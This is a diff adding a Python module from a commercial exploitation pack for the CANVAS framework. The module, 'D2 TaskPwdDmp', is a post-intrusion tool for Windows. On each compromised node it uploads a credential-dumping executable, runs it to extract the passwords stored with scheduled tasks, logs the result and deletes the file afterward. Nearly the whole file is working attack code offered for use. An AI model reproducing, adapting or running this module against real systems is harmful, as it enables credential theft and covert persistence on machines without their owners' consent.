@@ -1,0 +1,84 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2009
+#
+
+import sys, os
+import pygtk
+import gobject
+
+pygtk.require("2.0")
+import gtk
+import gtk.glade
+
+sys.path.append(".")
+
+from canvasexploit import canvasexploit
+from canvaserror import *
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+NAME = "D2 TaskPwdDmp"
+DESCRIPTION = "Dump the credentials associated with the planned tasks"
+VERSION = "1.0"
+
+DOCUMENTATION = {}
+DOCUMENTATION['VENDOR'] = None
+DOCUMENTATION["Date public"] = None
+DOCUMENTATION["CERT Advisory"] = None
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["References"] = None
+DOCUMENTATION["CVE Name"] = None
+DOCUMENTATION["CVE Url"] = None
+DOCUMENTATION["Notes"]= 'Tested on Win XP SP2 FR+US / Win2003 SP1 SP2 FR+US'
+
+PROPERTY={}
+PROPERTY['TYPE']="Post-Intrusion"
+PROPERTY['SITE']="Local" 
+PROPERTY['ARCH']=[ ["Windows"] ]
+
+class theexploit(canvasexploit):
+  def __init__(self):
+    canvasexploit.__init__(self)
+    self.node = "" 
+    self.host = ""
+    self.supportedNodeArgs = [["win32Node"]]
+    self.dstfile = 'c:\\d2sec_taskpwddmp.exe'
+    self.name = NAME
+
+  def getargs(self):
+    self.dstfile = self.argsDict.get("dstfile", self.dstfile)
+
+  def upload_and_exec(self):
+    self.log("[D2 LOG] Upload d2sec_taskpwddmp.exe to %s:%s" % (self.host, self.dstfile))
+    try:
+      self.node.shell.upload(os.path.join(os.getcwd(), '3rdparty/D2SEC/d2sec_modules/Windows/d2sec_taskpwddmp/d2sec_taskpwddmp.exe'), '', self.dstfile)
+    except Exception, e:
+      self.log('[D2 LOG] %s' % e)
+      return
+    str = self.node.shell.runcommand(self.dstfile)
+    self.log("[D2 LOG] d2sec_taskpwddmp.exe")
+    self.log(str + "\n")
+    ret = self.node.unlink(self.dstfile)
+    if not ret:
+      self.log("[D2 LOG] Could not unlink file %s" % self.dstfile)
+    return
+
+  def run(self):
+    for node in self.argsDict["passednodes"]:
+      type = node.nodetype
+      if type not in self.supportedNodeArgs[0]:
+        self.log("[D2 LOG] %s node type not supported"%type)
+        continue
+      self.node = node
+      self.getargs()
+      self.upload_and_exec()
+    return 1
+
+if __name__ == "__main__":
+  print "This module is meant to be run only within CANVAS"
+
